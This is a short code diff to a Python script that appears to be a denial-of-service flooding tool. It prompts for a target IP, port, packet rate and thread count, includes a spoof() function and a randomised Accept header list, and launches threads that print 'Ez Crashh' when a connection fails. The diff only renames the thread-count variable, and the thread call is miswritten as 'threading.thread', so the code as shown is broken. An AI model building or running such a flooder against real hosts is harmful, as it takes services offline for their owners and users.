@@ -32,8 +32,8 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 
 ip = str(input("Ip >= "))
 port = int(input("port >= "))
-th = int(input("Thread/t >="))
 pack = int(input("Pack/s >="))
+thread = int(input("Thread/t >="))
 
 def spoof():
   global byte1
@@ -84,6 +84,6 @@ def start():
         except:
             s.close()
             print("Ez Crashh")
-for i in range(th):
-  th = threading.thread(target=start)
-  th.start()
+for i in range(thread):
+  thred = threading.thread(target=start)
+  thred.start()
